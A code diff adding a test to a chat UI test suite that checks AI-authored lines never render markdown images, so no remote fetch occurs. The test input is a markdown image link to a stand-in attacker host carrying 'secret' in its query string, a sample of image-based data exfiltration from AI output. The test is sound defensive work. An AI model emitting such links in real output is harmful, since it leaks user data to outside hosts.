@@ -26,6 +26,14 @@ describe('ChatLine AI', () => {
     expect(container.textContent).not.toContain('Server Name')
   })
 
+  it('never renders an image from an AI line (no remote fetch)', () => {
+    const { container } = render(
+      <ul><ChatLine message={line('ai-bot-000000000000000000000001', undefined, 'see ![pic](https://evil.example/p.png?q=secret)')} showName timeFormat={fmt} /></ul>,
+    )
+    expect(container.querySelector('img')).toBeNull()
+    expect(container.textContent).toContain('pic')
+  })
+
   it('keeps human lines plain text', () => {
     const { container } = render(
       <ul><ChatLine message={line('u2', 'Bob', 'a **bold** word')} showName timeFormat={fmt} /></ul>,
